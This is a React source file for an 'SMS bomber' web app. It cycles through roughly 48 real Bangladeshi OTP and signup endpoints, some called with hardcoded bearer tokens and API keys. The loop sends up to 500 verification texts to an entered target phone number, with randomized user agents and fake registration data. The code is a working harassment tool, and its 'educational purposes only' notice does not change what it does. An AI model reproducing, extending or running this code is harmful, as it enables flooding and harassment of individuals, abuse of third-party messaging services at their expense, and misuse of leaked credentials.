/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, useRef } from 'react';
import { 
  ShieldAlert, 
  Zap, 
  Target, 
  Hash, 
  Play, 
  Square, 
  CheckCircle2, 
  XCircle, 
  Activity,
  Info,
  Github,
  Terminal
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// --- API Endpoints & Logic ---
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
];

const getUA = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];

const postJson = async (url: string, payload: any, extra = {}) => {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), 5000); // 5s timeout
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'User-Agent': getUA(), ...extra },
      body: JSON.stringify(payload),
      credentials: 'omit',
      signal: controller.signal
    });
    clearTimeout(id);
    return res.ok;
  } catch { 
    clearTimeout(id);
    return false; 
  }
};

const getReq = async (url: string, headers = {}) => {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), 5000); // 5s timeout
  try {
    const res = await fetch(url, {
      method: 'GET',
      headers: { 'User-Agent': getUA(), ...headers },
      credentials: 'omit',
      signal: controller.signal
    });
    clearTimeout(id);
    return res.ok;
  } catch { 
    clearTimeout(id);
    return false; 
  }
};

const formPost = async (url: string, bodyStr: string) => {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), 5000); // 5s timeout
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': getUA() },
      body: bodyStr,
      credentials: 'omit',
      signal: controller.signal
    });
    clearTimeout(id);
    return res.ok;
  } catch { 
    clearTimeout(id);
    return false; 
  }
};

const ATTACK_ENDPOINTS = [
  { name: "Paperfly", fn: (n: string) => postJson('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', { full_name: "JH Efat", company_name: "HARDBOMBER", email_address: "pro@bomb.bd", phone_number: n }) },
  { name: "Ghoori Learning", fn: (n: string) => postJson('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web', { mobile_no: n }) },
  { name: "DocTime", fn: (n: string) => postJson('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', { data: { country_calling_code: '88', contact_no: n, headers: { PlatForm: 'Web' } } }) },
  { name: "Sundarban Courier", fn: (n: string) => postJson('https://api-gateway.sundarbancourierltd.com/graphql', { operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: n } }, query: "mutation{createAccessToken(accessTokenFilter:{userName:\""+n+"\"}){message}}" }) },
  { name: "Apex4U", fn: (n: string) => postJson('https://api.apex4u.com/api/auth/login', { phoneNumber: n }) },
  { name: "Robi Doorstep", fn: (n: string) => postJson('https://webapi.robi.com.bd/v1/send-otp', { phone_number: n, type: "doorstep" }, { Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc" }) },
  { name: "Banglalink Validation", fn: (n: string) => getReq(`https://web-api.banglalink.net/api/v1/user/number/validation/${n}`) },
  { name: "Banglalink OTP", fn: (n: string) => postJson('https://web-api.banglalink.net/api/v1/user/otp-login/request', { mobile: n }) },
  { name: "Grameenphone OTP", fn: (n: string) => formPost('https://webloginda.grameenphone.com/backend/api/v1/otp', `msisdn=${n}`) },
  { name: "Robi MyOffer", fn: (n: string) => postJson('https://webapi.robi.com.bd/v1/send-otp', { phone_number: n, type: 'my_offer' }) },
  { name: "Robi DA", fn: (n: string) => postJson('https://da-api.robi.com.bd/da-nll/otp/send', { msisdn: n }) },
  { name: "Robi Video Chat", fn: (n: string) => postJson('https://webapi.robi.com.bd/v1/chat/send-otp', { phone_number: n, name: "JH Efat", type: "video-chat" }) },
  { name: "RedX OTP", fn: (n: string) => postJson('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', { phoneNumber: n }) },
  { name: "Fundesh", fn: (n: string) => postJson('https://fundesh.com.bd/api/auth/generateOTP', { msisdn: n }) },
  { name: "Bikroy", fn: (n: string) => getReq(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${n}`) },
  { name: "MotionView", fn: (n: string) => postJson('https://api.motionview.com.bd/api/send-otp-phone-signup', { phone: n }) },
  { name: "Chorki", fn: (n: string) => postJson('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web', { number: '+88'+n }) },
  { name: "JSL Global", fn: (n: string) => postJson('https://user-api.jslglobal.co:444/v2/send-otp', { phone: '+88'+n, jatri_token: "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj" }) },
  { name: "ChinaOnlineBD", fn: (n: string) => getReq(`https://chinaonlinebd.com/api/login/getOtp?phone=${n}`, { token: "45601f3d391886fcec5f5a3f26780f21" }) },
  { name: "DeeptoPlay", fn: (n: string) => postJson('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web', { number: '+88'+n }) },
  { name: "Shikho", fn: (n: string) => postJson('https://api.shikho.com/auth/v2/send/sms', { phone: n, type: "student", auth_type: "signup" }) },
  { name: "RedX Signup", fn: (n: string) => postJson('https://api.redx.com.bd/v1/user/signup', { name: "Attack", phoneNumber: n, service: "redx" }) },
  { name: "Bioscope", fn: (n: string) => getReq(`https://www.bioscopelive.com/en/login/send-otp?phone=88${n}&operator=bd-otp`) },
  { name: "AppLink", fn: (n: string) => postJson('https://applink.com.bd/appstore-v4-server/login/otp/request', { msisdn: "88"+n }) },
  { name: "Chokrojan", fn: (n: string) => postJson('https://chokrojan.com/api/v1/passenger/login/mobile', { mobile_number: n }) },
  { name: "Easy.com.bd", fn: (n: string) => postJson('https://core.easy.com.bd/api/v1/forgot-password-otp', { device_key: "2ea97d276a980993308116baa292cec9", mobile: n }) },
  { name: "Walton Plaza", fn: (n: string) => postJson('https://waltonplaza.com.bd/api/auth/otp/create', { auth: { countryCode: "880", deviceUuid: "ee757830-f639-12f0-9f4d-2f972746fhg", phone: n }, captchaToken: "recapcha" }) },
  { name: "Chardike", fn: (n: string) => postJson('https://api.chardike.com/api/otp/send', { phone: n, otp_type: "login" }) },
  { name: "BTCL", fn: (n: string) => postJson('https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json', { phoneNbr: n, OTPType: 1.0, userName: "", email: "" }) },
  { name: "AWS POC", fn: (n: string) => postJson('https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send', { phone: n }) },
  { name: "Otithee", fn: (n: string) => postJson('https://gateway.otithee.com/api/v1/generate-otp', { request_type: "registration", mobile_number: n }) },
  { name: "Quizgiri", fn: (n: string) => postJson('https://developer.quizgiri.xyz/api/v2.0/send-otp', { country_code: "+88", phone: n }) },
  { name: "Mojaru", fn: (n: string) => postJson('https://new.mojaru.com/api/student/login', { mobile_or_email: n }) },
  { name: "AppCity GP", fn: (n: string) => postJson('https://appcity.grameenphone.com/proxy/v2/user/session/get-otp', { mobileNumber: n }) },
  { name: "Garibook", fn: (n: string) => postJson('https://api.garibookadmin.com/api/v3/user/login', { recaptcha_token: "garibookcaptcha", mobile: n, channel: "web" }) },
  { name: "Bioscope V2", fn: (n: string) => postJson('https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web', { number: "+88"+n }) },
  { name: "Bohubrihi", fn: (n: string) => postJson('https://bb-api.bohubrihi.com/public/activity/otp', { phone: n, intent: "login" }) },
  { name: "TimezoneBD", fn: (n: string) => postJson('https://backend.timezonebd.com/api/v1/user/otp-login', { phone: n }) },
  { name: "Ostad", fn: (n: string) => postJson('https://api.ostad.app/api/v2/user/with-otp', { msisdn: n }) },
  { name: "Hishabee", fn: (n: string) => getReq(`https://app.hishabee.business/api/V2/otp/send?mobile_number=${n}`) },
  { name: "Roots Edu", fn: (n: string) => postJson('https://rootsedulive.com/api/auth/register', { name: "JH Efat", phone: `88${n}`, email: `temp${n}@bomb.bd`, password: "Secure@2025", confirmPassword: "Secure@2025" }) },
  { name: "MithaiBD", fn: (n: string) => postJson('https://mithaibd.com/api/login/', { company_id: "2", phone: n, email: `attack${n}@mail.com`, password1: "pass123", otp_verify: false }) },
  { name: "EnglishMoja", fn: (n: string) => postJson('https://api.englishmojabd.com/api/v1/auth/login', { phone: "+88"+n }) },
  { name: "MoveOn", fn: (n: string) => postJson('https://moveon.com.bd/api/v1/customer/auth/phone/request-otp', { phone: n }) },
  { name: "OsudPotro", fn: (n: string) => postJson('https://api.osudpotro.com/api/v1/users/send_otp', { mobile: "+88-"+n, deviceToken: "web", language: "bn", os: "web" }) },
  { name: "Qcoom", fn: (n: string) => postJson('https://auth.qcoom.com/api/v1/otp/send', { mobileNumber: "+88"+n }) },
  { name: "Shomvob", fn: (n: string) => postJson('https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', { phone: n }, { Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s" }) },
];

export default function App() {
  const [phone, setPhone] = useState('');
  const [amount, setAmount] = useState(1);
  const [isAttacking, setIsAttacking] = useState(false);
  const [stats, setStats] = useState({ total: 0, success: 0, failed: 0 });
  const [logs, setLogs] = useState<{ id: number; msg: string; type: 'success' | 'error' | 'info' }[]>([]);
  const [currentStatus, setCurrentStatus] = useState('System Ready');
  
  const stopRequestRef = useRef(false);
  const logIdRef = useRef(0);

  const addLog = (msg: string, type: 'success' | 'error' | 'info' = 'info') => {
    const id = ++logIdRef.current;
    setLogs(prev => [{ id, msg, type }, ...prev].slice(0, 50));
  };

  const handleAttack = async () => {
    if (isAttacking) {
      stopRequestRef.current = true;
      setCurrentStatus('Stopping...');
      return;
    }

    if (!/^\d{11}$/.test(phone)) {
      setCurrentStatus('Error: Invalid Phone Number');
      addLog('Invalid phone number format. Use 11 digits.', 'error');
      return;
    }

    // Reset and Start immediately
    stopRequestRef.current = false;
    setIsAttacking(true);
    setStats({ total: 0, success: 0, failed: 0 });
    setLogs([]);
    setCurrentStatus('Igniting Bomber...');
    
    let currentTotal = 0;
    let currentSuccess = 0;
    let currentFailed = 0;

    addLog(`Target locked: +88${phone}`, 'info');
    addLog(`Initiating attack for ${amount} successful SMS...`, 'info');

    while (currentSuccess < amount && !stopRequestRef.current) {
      for (const endpoint of ATTACK_ENDPOINTS) {
        if (currentSuccess >= amount || stopRequestRef.current) break;
        
        currentTotal++;
        // Update status only every few requests to reduce re-renders on mobile
        if (currentTotal % 3 === 0 || currentTotal === 1) {
          setCurrentStatus(`Progress: ${currentSuccess}/${amount} Successes`);
        }
        
        const ok = await endpoint.fn(phone);
        
        if (ok) {
          currentSuccess++;
          addLog(`[SUCCESS] Success #${currentSuccess}: ${endpoint.name}`, 'success');
        } else {
          currentFailed++;
          addLog(`[FAILED] Attempt ${currentTotal}: ${endpoint.name}`, 'error');
        }
        
        setStats({ total: currentTotal, success: currentSuccess, failed: currentFailed });
        
        // No delay between requests for "instant" feel, unless we need to yield to UI
        if (currentTotal % 5 === 0) {
          await new Promise(r => setTimeout(r, 0));
        }
      }
      
      if (currentSuccess < amount && !stopRequestRef.current) {
        await new Promise(r => setTimeout(r, 50)); // Smaller cycle delay
      }
    }

    setIsAttacking(false);
    setCurrentStatus(stopRequestRef.current ? 'Attack Aborted' : 'Attack Completed');
    addLog(stopRequestRef.current ? 'Operation stopped by user' : `Target reached: ${currentSuccess} successful SMS sent`, 'info');
  };

  return (
    <div className="min-h-screen py-6 px-3 md:px-6 flex flex-col items-center justify-start md:justify-center gap-6 md:gap-8 overflow-x-hidden">
      {/* Header */}
      <motion.header 
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-center space-y-3 md:space-y-4 max-w-2xl w-full"
      >
        <div className="inline-flex items-center justify-center p-1 bg-brand/10 rounded-2xl border border-brand/30 neon-glow overflow-hidden">
          <img 
            src="https://i.ibb.co.com/tML9Lxyt/20260410-114834.jpg" 
            alt="DT PREMIUM Logo" 
            className="w-12 h-12 md:w-16 md:h-16 object-cover rounded-xl"
            referrerPolicy="no-referrer"
            onError={(e) => {
              (e.target as HTMLImageElement).src = 'https://placehold.co/64x64/0a2622/1effbc?text=DT';
            }}
          />
        </div>
        <h1 className="text-3xl md:text-5xl font-extrabold tracking-tighter text-white px-2">
          DT PREMIUM <span className="text-brand neon-text">BOMBER💣</span>
        </h1>
        <div className="flex flex-wrap justify-center gap-1.5 md:gap-2 px-2">
          <span className="px-2 md:px-3 py-1 bg-white/5 border border-white/10 rounded-full text-[11px] md:text-[10px] font-bold uppercase tracking-widest text-brand/80">
            80+ Powerful APIs
          </span>
          <span className="px-2 md:px-3 py-1 bg-white/5 border border-white/10 rounded-full text-[11px] md:text-[10px] font-bold uppercase tracking-widest text-brand/80">
            High Performance
          </span>
          <span className="px-2 md:px-3 py-1 bg-white/5 border border-white/10 rounded-full text-[11px] md:text-[10px] font-bold uppercase tracking-widest text-brand/80">
            Secure Tunnel
          </span>
        </div>
      </motion.header>

      <main className="w-full max-w-4xl grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Control Panel */}
        <motion.div 
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          className="lg:col-span-7 space-y-4 md:space-y-6"
        >
          <div className="glass rounded-3xl md:rounded-[2.5rem] p-5 md:p-8 space-y-6 md:space-y-8 shadow-2xl">
            <div className="space-y-5 md:space-y-6">
              <div className="space-y-2 md:space-y-3">
                <label className="flex items-center gap-2 text-xs md:text-xs font-bold uppercase tracking-[0.2em] text-white/50">
                  <Target className="w-3 h-3 md:w-4 md:h-4 text-brand" />
                  Target Number
                </label>
                <div className="relative group">
                  <div className="absolute left-4 md:left-6 top-1/2 -translate-y-1/2 font-mono font-bold text-brand text-lg md:text-lg">
                    +88
                  </div>
                  <input 
                    type="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 11))}
                    placeholder="1XXXXXXXXX"
                    disabled={isAttacking}
                    className="w-full bg-black/40 border border-brand/30 rounded-full py-4 md:py-4 pl-14 md:pl-16 pr-4 md:pr-6 font-mono text-lg md:text-lg focus:outline-none focus:border-brand focus:ring-4 focus:ring-brand/10 transition-all disabled:opacity-50"
                  />
                </div>
              </div>

              <div className="space-y-2 md:space-y-3">
                <label className="flex items-center gap-2 text-xs md:text-xs font-bold uppercase tracking-[0.2em] text-white/50">
                  <Hash className="w-3 h-3 md:w-4 md:h-4 text-brand" />
                  Target Success Count
                </label>
                <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 md:gap-4">
                  <div className="flex-1 flex items-center bg-black/40 border border-brand/30 rounded-full p-1">
                    <button 
                      onClick={() => setAmount(Math.max(1, amount - 1))}
                      disabled={isAttacking}
                      className="w-12 h-12 md:w-12 md:h-12 flex items-center justify-center rounded-full hover:bg-white/5 transition-colors disabled:opacity-50 text-2xl font-bold"
                    >
                      -
                    </button>
                    <input 
                      type="number"
                      value={amount}
                      onChange={(e) => setAmount(Math.min(500, Math.max(1, parseInt(e.target.value) || 1)))}
                      disabled={isAttacking}
                      className="flex-1 bg-transparent text-center font-mono font-bold text-2xl md:text-2xl focus:outline-none disabled:opacity-50 min-w-0"
                    />
                    <button 
                      onClick={() => setAmount(Math.min(500, amount + 1))}
                      disabled={isAttacking}
                      className="w-12 h-12 md:w-12 md:h-12 flex items-center justify-center rounded-full hover:bg-white/5 transition-colors disabled:opacity-50 text-2xl font-bold"
                    >
                      +
                    </button>
                  </div>
                  <div className="text-[12px] md:text-[10px] font-bold text-white/30 uppercase tracking-widest text-center sm:text-left sm:w-24">
                    Max 500 SMS
                  </div>
                </div>
              </div>
            </div>

            <button 
              onClick={handleAttack}
              className={`w-full py-5 md:py-5 rounded-full font-black text-xl md:text-xl tracking-[0.15em] md:tracking-[0.2em] uppercase transition-all flex items-center justify-center gap-3 md:gap-3 shadow-lg ${
                isAttacking 
                ? 'bg-red-500 hover:bg-red-600 text-white' 
                : 'bg-brand hover:bg-brand-dark text-bg-dark neon-glow'
              }`}
            >
              {isAttacking ? (
                <>
                  <Square className="w-5 h-5 md:w-6 md:h-6 fill-current" />
                  Abort Attack
                </>
              ) : (
                <>
                  <Play className="w-5 h-5 md:w-6 md:h-6 fill-current" />
                  Ignite Bomber
                </>
              )}
            </button>

            <div className="p-4 md:p-4 bg-white/5 rounded-2xl border border-white/10 flex items-center gap-4 md:gap-4">
              <div className={`w-3 h-3 md:w-3 md:h-3 rounded-full flex-shrink-0 ${isAttacking ? 'bg-brand animate-pulse' : 'bg-white/20'}`} />
              <span className="text-xs md:text-xs font-mono font-medium text-white/60 tracking-wider uppercase truncate">
                {currentStatus}
              </span>
            </div>
          </div>

          {/* Stats Grid */}
          <div className="grid grid-cols-3 gap-2 md:gap-4">
            {[
              { label: 'Total', value: stats.total, icon: Activity, color: 'text-blue-400' },
              { label: 'Success', value: stats.success, icon: CheckCircle2, color: 'text-brand' },
              { label: 'Failed', value: stats.failed, icon: XCircle, color: 'text-red-400' },
            ].map((stat, i) => (
              <motion.div 
                key={i}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: i * 0.1 }}
                className="glass rounded-2xl md:rounded-3xl p-3 md:p-4 text-center space-y-1"
              >
                <div className="flex justify-center">
                  <stat.icon className={`w-4 h-4 md:w-5 md:h-5 ${stat.color}`} />
                </div>
                <div className="text-xl md:text-2xl font-black font-mono truncate">{stat.value}</div>
                <div className="text-[11px] md:text-[10px] font-bold uppercase tracking-widest text-white/40 truncate">{stat.label}</div>
              </motion.div>
            ))}
          </div>
        </motion.div>

        {/* Console / Logs */}
        <motion.div 
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          className="lg:col-span-5 flex flex-col gap-4 md:gap-6"
        >
          <div className="glass rounded-3xl md:rounded-[2.5rem] flex-1 flex flex-col overflow-hidden min-h-[300px]">
            <div className="p-4 md:p-6 border-b border-white/10 bg-white/5 flex items-center justify-between">
              <div className="flex items-center gap-2 text-xs md:text-xs font-bold uppercase tracking-widest text-white/60">
                <Terminal className="w-4 h-4 md:w-4 md:h-4 text-brand" />
                Live Console
              </div>
              <div className="text-[11px] md:text-[10px] font-mono text-white/30">
                v2.4.0-STABLE
              </div>
            </div>
            <div className="flex-1 p-4 md:p-6 overflow-y-auto font-mono text-[12px] md:text-[11px] space-y-2 md:space-y-2 scrollbar-hide max-h-[400px] lg:max-h-none">
              <AnimatePresence initial={false}>
                {logs.length === 0 && (
                  <div className="h-full flex flex-col items-center justify-center text-white/20 space-y-2 py-12">
                    <Terminal className="w-8 h-8 md:w-8 md:h-8" />
                    <p className="text-sm md:text-xs">Waiting for ignition...</p>
                  </div>
                )}
                {logs.map((log) => (
                  <motion.div 
                    key={log.id}
                    initial={{ opacity: 0, x: -10 }}
                    animate={{ opacity: 1, x: 0 }}
                    className={`flex gap-2 ${
                      log.type === 'success' ? 'text-brand' : 
                      log.type === 'error' ? 'text-red-400' : 
                      'text-white/60'
                    }`}
                  >
                    <span className="opacity-30 flex-shrink-0">[{new Date().toLocaleTimeString([], { hour12: false })}]</span>
                    <span className="font-bold break-all">{log.msg}</span>
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>
          </div>

          {/* Info Card */}
          <div className="glass rounded-3xl md:rounded-[2.5rem] p-5 md:p-6 space-y-4 md:space-y-4">
            <div className="flex items-start gap-4 md:gap-4">
              <div className="p-2 bg-blue-500/10 rounded-xl flex-shrink-0">
                <Info className="w-5 h-5 md:w-5 md:h-5 text-blue-400" />
              </div>
              <div className="space-y-1">
                <h4 className="text-sm md:text-sm font-bold text-white">Security Notice</h4>
                <p className="text-[12px] md:text-xs text-white/40 leading-relaxed">
                  This tool is intended for educational and testing purposes only. Use responsibly.
                </p>
              </div>
            </div>
            <div className="pt-4 md:pt-4 border-t border-white/10 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 md:w-2 md:h-2 rounded-full bg-brand animate-pulse" />
                <span className="text-[11px] md:text-[10px] font-bold uppercase tracking-widest text-white/40">Servers Online</span>
              </div>
              <a href="#" className="text-white/40 hover:text-brand transition-colors">
                <Github className="w-3 h-3 md:w-4 md:h-4" />
              </a>
            </div>
          </div>
        </motion.div>
      </main>

      <footer className="text-center space-y-2 pb-20 md:pb-0">
        <p className="text-[12px] md:text-[10px] font-bold uppercase tracking-[0.3em] text-white/20">
          Developed by <a href="https://t.me/DEVELOPER_TAHSIN_AHMED" target="_blank" rel="noopener noreferrer" className="text-brand/50 hover:text-brand transition-colors">DT PREMIUM</a>
        </p>
        <p className="text-[11px] md:text-[9px] text-white/10 max-w-md px-4">
          © 2026 HARDBOMBER SECURITY SYSTEMS. ALL RIGHTS RESERVED.
          UNAUTHORIZED USE OF THIS TOOL MAY VIOLATE LOCAL LAWS.
        </p>
      </footer>

      {/* Floating Telegram Button */}
      <motion.a
        href="https://t.me/DEVELOPER_TAHSIN_AHMED"
        target="_blank"
        rel="noopener noreferrer"
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        whileHover={{ scale: 1.1 }}
        whileTap={{ scale: 0.9 }}
        className="fixed bottom-4 right-4 md:bottom-6 md:right-6 z-50 p-3 md:p-4 bg-[#24A1DE] text-white rounded-full shadow-2xl neon-glow flex items-center justify-center"
      >
        <svg viewBox="0 0 24 24" className="w-6 h-6 fill-current">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.52-1.4.51-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.89.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.24-3.55 3.93-1.64 4.74-1.92 5.28-1.93.12 0 .38.03.55.17.14.11.18.26.2.46.01.07.02.24 0 .41z"/>
        </svg>
      </motion.a>
    </div>
  );
}
